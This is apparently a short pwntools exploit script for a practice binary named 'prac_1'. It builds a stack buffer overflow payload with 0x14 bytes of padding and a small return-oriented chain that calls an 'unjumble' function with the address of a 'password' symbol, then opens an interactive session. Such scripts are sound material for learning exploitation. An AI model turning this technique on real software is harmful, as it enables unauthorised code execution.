from pwn import *

context.log_level = 'critical'

p = process('./prac_1')
e = p.elf

payload = b'A' * 0x14
payload += p32(e.symbols['unjumble']) # OR 0x080484e8
payload += p32(0x080484e3) # pop eax; ret
payload += p32(e.symbols['password']) # or 0x0804a028
# you could also put a return address here so it doesn't crash

p.sendlineafter(b'?\n', payload)
p.interactive()
p.close()
